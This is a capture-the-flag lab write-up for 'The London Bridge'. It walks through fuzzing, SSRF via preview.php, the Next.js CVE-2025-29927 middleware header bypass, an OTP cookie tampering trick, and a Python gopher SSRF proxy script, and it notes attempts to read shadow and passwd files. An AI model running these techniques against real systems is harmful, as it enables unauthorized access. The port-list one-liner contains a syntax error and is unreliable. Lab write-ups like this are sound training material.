## The London Bridge - Writeup

An easy one!

### Port scan

`sudo nmap --top-ports 1000 -oN nmap_initial.txt IP_ADDRESS`
Found ports:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http-proxy
```

### Checked the web pages

- Found web app at 80
- Several pages are available, nth significant
- Enumerated web-pages
  - `ffuf -u 'http://TARGET_IP/FUZZ' -w /usr/share/wordlists/rockyou.txt -mc all -t 100 -ic -fc 404 -e .php`
  - `ffuf -u 'http://TARGET_IP/FUZZ' -w /usr/share/wordlists/rockyou.txt -mc all -t 100 -ic -fc 404`
  - Found `/management`, but has an authentication wall
  - Intercepted the req on browser and did some diggin, found nth significant(nth vuln)
  - Found `/preview.php` as well
  - Found `preview.php` and enumerated for it's possible params, found `url`
  - Also found one API link to some `/customapi` page which is authenticated
- This preview call is paritally vuln to SSRF
  - Checked hitting my local server via `nc -lvnp 4400` and `python3 -m http.server`
  - Also hit that `/management` end-point
  - `file://*` was blocked(yeah, attempted to read shadow and passwd files)
- An hr after banging my head, re-did `nmap` scan
  - `sudo nmap --top-ports 10000 -oN nmap_extend.txt IP_ADDRESS`
  - Found nth still
  - Took some help, and now enumerated on ports via `preview.php` and `url`
  - `python3 -c 'for i in range(1,65336) print(i);' > ports.txt`
  - `ffuf -u 'http://TARGET_IP/preview.php?url=127.0.0.1:FUZZ' -w ports.txt -mc all -t 100 -fs 0`
  - Found `10000` port
- Ok, sorta stuck again! Application is based off next.js and tried out recent popular vuln's for it ... CVE-2025-29927 provides auth-bypass
- Copied the cURL and added header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` and I was able to access both `/management` and `/customapi`
- `/customapi` had the FLAG-1 and username and password for `/management`
!(SS|pass)[./ss.png]
- Used the username and password, asks for OTP
- Switched ON my burp-suite to intercept the OTP req's response on `/management/2fa.php` and found one base64 encoded cookie containing `validated` flag set to `0`, i set it to `1`
- I am in ... Found FLAG-2
- Later on realized read that this `2fa.php` page's response's vuln could've been avoided by adding some hash or signature in some unknown algorithm and random seeds

Mr.GPT recommended sth wonderful here to make my life easier... a gopher proxy code in python 

```python
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = 'localhost'
LPORT = 8888
TARGET_HOST = "TARGET_IP"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000 # mod to 80 later for /management end-point

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()
```

And ran `python3 gopproxy.py`